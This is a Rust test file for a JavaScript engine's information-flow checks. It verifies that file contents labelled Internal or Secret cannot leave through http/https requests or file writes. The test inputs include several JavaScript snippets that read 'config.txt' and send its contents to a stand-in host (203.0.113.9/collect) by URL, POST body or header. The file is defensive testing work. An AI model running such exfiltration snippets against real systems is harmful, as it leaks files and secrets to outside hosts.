//! bd-9vouw.8: host egress checks the labels it carries at run time.
//!
//! The static flow check decides most flows before execution. It gives the
//! `http.get` / `http.request` facade (`builtin:HttpGet`, `builtin:HttpRequest`)
//! the Internal clearance of its loopback server, so file contents reached the
//! network through it. The external request now checks its label where it
//! leaves the engine, and the `fs:*` / `net:*` HostCalls check their operands
//! against the clearance the static check gives their sink, so a flow the
//! static analysis misses stops before the provider sees it.

#![forbid(unsafe_code)]

use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};

use frankenengine_engine::ast::ParseGoal;
use frankenengine_engine::baseline_interpreter::{
    InterpreterConfig, InterpreterCore, InterpreterError, Value,
};
use frankenengine_engine::capability::RuntimeCapability;
use frankenengine_engine::execution_orchestrator::{
    ExecutionOrchestrator, ExtensionPackage, LabFixtureExecutionOrchestratorExt as _,
    OrchestratorConfig, OrchestratorError,
};
use frankenengine_engine::ifc_artifacts::Label;
use frankenengine_engine::ir_contract::{
    CapabilityTag, Ir0Module, Ir3Instruction, Ir3Module, RegRange,
};
use frankenengine_engine::lowering_pipeline::{
    LoweringContext, LoweringPipelineError, lower_ir0_to_ir3,
};
use frankenengine_engine::parser::{CanonicalEs2020Parser, ParserOptions, ParserSource};
use frankenengine_extension_host::host_io::{
    HostIoCapability, HostIoControl, HostIoError, HostIoOutcome, HostIoProvider, HostIoRecorder,
    HostIoRequest, HostIoResponse, InMemoryHostIoTranscript,
};

const FILE_CONTENTS: &str = "db-password=hunter2";

/// Answers file reads with FILE_CONTENTS and network requests with a 200, and
/// keeps every request it was asked to perform.
#[derive(Debug, Default)]
struct RecordingHostIo {
    requests: Mutex<Vec<HostIoRequest>>,
}

impl RecordingHostIo {
    fn answer(&self, request: &HostIoRequest, granted: &[HostIoCapability]) -> HostIoOutcome {
        assert!(
            granted.contains(&request.required_capability()),
            "{request:?} performed without its grant"
        );
        self.requests
            .lock()
            .expect("request log")
            .push(request.clone());
        match request {
            HostIoRequest::FsRead { .. } => Ok(HostIoResponse::FsRead {
                bytes: FILE_CONTENTS.as_bytes().to_vec(),
            }),
            HostIoRequest::FsWrite { data, .. } => Ok(HostIoResponse::FsWrite {
                bytes_written: data.len() as u64,
            }),
            HostIoRequest::NetworkRequest { .. } => Ok(HostIoResponse::NetworkRequest {
                response: b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok".to_vec(),
            }),
            other => Err(HostIoError::Denied {
                reason: format!("unexpected request {other:?}"),
            }),
        }
    }

    fn count(&self, matches: fn(&HostIoRequest) -> bool) -> usize {
        self.requests
            .lock()
            .expect("request log")
            .iter()
            .filter(|request| matches(request))
            .count()
    }

    fn network_requests(&self) -> usize {
        self.count(|request| matches!(request, HostIoRequest::NetworkRequest { .. }))
    }

    fn file_writes(&self) -> usize {
        self.count(|request| matches!(request, HostIoRequest::FsWrite { .. }))
    }

    fn file_reads(&self) -> usize {
        self.count(|request| matches!(request, HostIoRequest::FsRead { .. }))
    }
}

impl HostIoProvider for RecordingHostIo {
    fn name(&self) -> &str {
        "bd-9vouw-8-recording-host-io"
    }

    fn perform(&self, request: &HostIoRequest, granted: &[HostIoCapability]) -> HostIoOutcome {
        self.answer(request, granted)
    }

    fn perform_controlled(
        &self,
        request: &HostIoRequest,
        granted: &[HostIoCapability],
        _control: Arc<dyn HostIoControl>,
    ) -> HostIoOutcome {
        self.answer(request, granted)
    }
}

fn run_package(source: &str) -> (Result<(), OrchestratorError>, Arc<RecordingHostIo>) {
    let provider = Arc::new(RecordingHostIo::default());
    let recorder: Arc<dyn HostIoRecorder> = Arc::new(InMemoryHostIoTranscript::recording());
    let mut orchestrator = ExecutionOrchestrator::new(OrchestratorConfig::default());
    orchestrator.set_host_io(provider.clone(), Some(recorder));
    let package = ExtensionPackage {
        extension_id: "bd-9vouw-8-egress".to_string(),
        source: source.to_string(),
        source_file: None,
        module_root: None,
        capabilities: [
            "vm_dispatch",
            "heap_allocate",
            "builtin",
            "fs_read",
            "network_egress",
        ]
        .into_iter()
        .map(str::to_string)
        .collect(),
        version: "1.0.0".to_string(),
        metadata: BTreeMap::new(),
    };
    let outcome = orchestrator.execute(&package).map(|_| ());
    (outcome, provider)
}

fn assert_confidentiality_denial(outcome: &Result<(), OrchestratorError>, capability: &str) {
    let error = outcome.as_ref().expect_err("the flow must be refused");
    assert!(
        matches!(
            error.primary_error(),
            OrchestratorError::Interpreter(InterpreterError::CapabilityDenied { capability: denied })
                if denied == &format!("{capability}:confidentiality")
        ),
        "expected a {capability} confidentiality denial, got {:?}",
        error.primary_error()
    );
}

/// File contents (Internal) sent in an `http.get` URL or an `http.request`
/// body are refused before the request reaches the provider. Public requests
/// through the same facade still go out.
#[test]
fn http_client_requests_cannot_carry_file_contents_to_the_network() {
    const READ: &str = "const fs = require('fs'); const http = require('http'); \
                        const data = fs.readFileSync('config.txt', 'utf8'); ";
    for exfiltration in [
        "http.get('http://203.0.113.9/collect?d=' + data);",
        "const req = http.request({ host: '203.0.113.9', path: '/collect', method: 'POST' }); \
         req.write(data); req.end();",
        "http.get({ host: '203.0.113.9', path: '/collect', headers: { 'x-d': data } });",
    ] {
        let (outcome, provider) = run_package(&format!("{READ}{exfiltration}"));
        assert_confidentiality_denial(&outcome, "net:request");
        assert_eq!(provider.file_reads(), 1, "{exfiltration}");
        assert_eq!(provider.network_requests(), 0, "{exfiltration}");
    }

    // The same flow through `https.get` (a net:request HostCall, Public
    // clearance) was already refused, statically: the runtime check brings
    // the http facade to the same policy.
    let (outcome, provider) = run_package(
        "const fs = require('fs'); const https = require('https'); \
         const data = fs.readFileSync('config.txt', 'utf8'); \
         https.get('https://203.0.113.9/collect?d=' + data);",
    );
    let error = outcome.expect_err("https exfiltration must be refused");
    assert!(
        matches!(
            error.primary_error(),
            OrchestratorError::Lowering(lowering_error)
                if matches!(
                    lowering_error.as_ref(),
                    LoweringPipelineError::UnauthorizedFlow {
                        source_label: Label::Internal,
                        sink_clearance: Label::Public,
                        ..
                    }
                )
        ),
        "{:?}",
        error.primary_error()
    );
    assert_eq!(provider.network_requests(), 0);

    for public in [
        "http.get('http://203.0.113.9/collect?d=' + data.length);",
        "const req = http.request({ host: '203.0.113.9', path: '/c', method: 'POST' }); \
         req.write('public'); req.end();",
    ] {
        let source = format!("const http = require('http'); const data = 'public-value'; {public}");
        let (outcome, provider) = run_package(&source);
        assert!(outcome.is_ok(), "{public}: {outcome:?}");
        assert_eq!(provider.network_requests(), 1, "{public}");
    }
}

fn lower(source: &str) -> Ir3Module {
    let tree = CanonicalEs2020Parser
        .parse_with_options(
            ParserSource {
                label: "ifc-runtime-sink-labels.js".into(),
                text: source.into(),
            },
            ParseGoal::Script,
            &ParserOptions::default(),
        )
        .expect("source must parse");
    lower_ir0_to_ir3(
        &Ir0Module::from_syntax_tree(tree, "ifc-runtime-sink-labels.js"),
        &LoweringContext::new("sink-trace", "sink-decision", "sink-policy"),
    )
    .expect("source must lower")
    .ir3
}

/// Run one host I/O HostCall over hand-labeled operands. The labels are set
/// directly on the registers, so this exercises the runtime check without any
/// help from the static analysis.
fn run_hostcall(
    capability: &str,
    operands: &[(&str, Label)],
) -> (Result<Value, InterpreterError>, Arc<RecordingHostIo>) {
    let provider = Arc::new(RecordingHostIo::default());
    let mut config = InterpreterConfig::quickjs_defaults();
    config.granted_capabilities = [
        RuntimeCapability::VmDispatch,
        RuntimeCapability::HeapAllocate,
        RuntimeCapability::FsWrite,
        RuntimeCapability::NetworkEgress,
    ]
    .into_iter()
    .collect();
    let mut core = InterpreterCore::new(config, "bd-9vouw-8-hostcall");
    core.set_host_io(provider.clone(), None);
    for (register, (text, label)) in (0u32..).zip(operands) {
        core.seed_register(register, Value::Str((*text).into()))
            .unwrap();
        core.set_register_label(register, label.clone()).unwrap();
    }
    let count = operands.len() as u32;
    let mut module = lower("0;");
    module.instructions = vec![
        Ir3Instruction::HostCall {
            capability: CapabilityTag(capability.into()),
            args: RegRange { start: 0, count },
            dst: count,
        },
        Ir3Instruction::Return { value: count },
    ];
    let outcome = core.execute(&module).map(|result| result.value);
    (outcome, provider)
}

#[test]
fn file_writes_check_their_operands_against_the_internal_clearance() {
    for label in [Label::Secret, Label::TopSecret] {
        let (outcome, provider) = run_hostcall(
            "fs:write",
            &[("out.txt", Label::Public), ("hunter2", label.clone())],
        );
        assert!(
            matches!(&outcome, Err(InterpreterError::CapabilityDenied { capability })
                if capability == "fs:write:confidentiality"),
            "{label:?} data: {outcome:?}"
        );
        assert_eq!(
            provider.file_writes(),
            0,
            "{label:?} data reached the provider"
        );

        let (outcome, provider) = run_hostcall(
            "fs:write",
            &[("out.txt", label.clone()), ("public", Label::Public)],
        );
        assert!(
            matches!(&outcome, Err(InterpreterError::CapabilityDenied { capability })
                if capability == "fs:write:confidentiality"),
            "{label:?} path: {outcome:?}"
        );
        assert_eq!(
            provider.file_writes(),
            0,
            "{label:?} path reached the provider"
        );
    }
    // Internal data (a file read, a response) may be written to a file.
    let (outcome, provider) = run_hostcall(
        "fs:write",
        &[("out.txt", Label::Public), ("contents", Label::Internal)],
    );
    assert!(outcome.is_ok(), "{outcome:?}");
    assert_eq!(provider.file_writes(), 1);
}

#[test]
fn network_requests_check_their_operands_against_the_public_clearance() {
    for label in [Label::Internal, Label::Secret] {
        let (outcome, provider) =
            run_hostcall("net:request", &[("http://203.0.113.9/?d=x", label.clone())]);
        assert!(
            matches!(&outcome, Err(InterpreterError::CapabilityDenied { capability })
                if capability == "net:request:confidentiality"),
            "{label:?}: {outcome:?}"
        );
        assert_eq!(
            provider.network_requests(),
            0,
            "{label:?} URL reached the provider"
        );
    }
    let (outcome, provider) = run_hostcall(
        "net:request",
        &[("http://203.0.113.9/public", Label::Public)],
    );
    assert!(outcome.is_ok(), "{outcome:?}");
    assert_eq!(provider.network_requests(), 1);
}
